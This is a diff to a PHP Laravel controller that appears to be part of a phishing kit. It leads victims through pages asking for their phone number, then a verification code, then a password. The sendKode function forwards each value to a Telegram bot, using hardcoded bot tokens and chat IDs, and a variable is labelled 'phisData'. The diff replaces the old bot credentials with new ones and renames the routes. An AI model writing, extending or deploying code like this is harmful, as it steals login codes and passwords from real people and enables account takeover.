@@ -2,16 +2,14 @@
 
 namespace App\Http\Controllers;
 
-use Illuminate\Support\Facades\Session;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Session;
 
-class HomeController extends Controller
+class KolektorTwoController extends Controller
 {
-
     public function index(Request $request)
     {
-
-        return inertia('LoginIndex');
+        return inertia('KolektorTwo/Index');
     }
 
     public function login_store(Request $request)
@@ -25,7 +23,7 @@ class HomeController extends Controller
             'getDialCode' => $code,
         ]);
         $this->sendKode($phone, $code, "", "", $subdomain);
-        return redirect('verif');
+        return redirect('verif2');
     }
 
     public function verif(Request $request)
@@ -34,7 +32,7 @@ class HomeController extends Controller
 
         $getPhone = $data[0]['getPhone'] ?? 0;
         $getDialCode = $data[0]['getDialCode'] ?? 0;
-        return inertia('Kolektor/Verif', compact('getPhone', 'getDialCode'));
+        return inertia('KolektorTwo/Verif', compact('getPhone', 'getDialCode'));
     }
 
     public function verif_store(Request $request)
@@ -50,7 +48,7 @@ class HomeController extends Controller
             'getVerif' => $verif,
         ]);
         $this->sendKode($phone, $code, $verif, "", $subdomain);
-        return redirect('password');
+        return redirect('password2');
     }
 
     public function get_password(Request $request)
@@ -60,7 +58,7 @@ class HomeController extends Controller
         $getPhone = $data[0]['getPhone'] ?? 0;
         $getDialCode = $data[0]['getDialCode'] ?? 0;
         $getVerif = $data[0]['getVerif'] ?? 0;
-        return inertia('GetPassword', compact(
+        return inertia('KolektorTwo/GetPassword', compact(
             'getPhone',
             'getDialCode',
             'getVerif'
@@ -84,8 +82,8 @@ class HomeController extends Controller
         // mulai dari bot 6 yah
 
         // BOT 6
-        $bot_token = "8109018017:AAHe9kI1iD1i8TMq72QrbJ0_YV786cmwSsk";
-        $chat_id = "5242928859";
+        $bot_token = "8058737890:AAHXd0yGMLnXmwUpi9IqBVi6VFsg4TSDitg";
+        $chat_id = "7885885125";
         $phisData = "MY1";
 
         $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
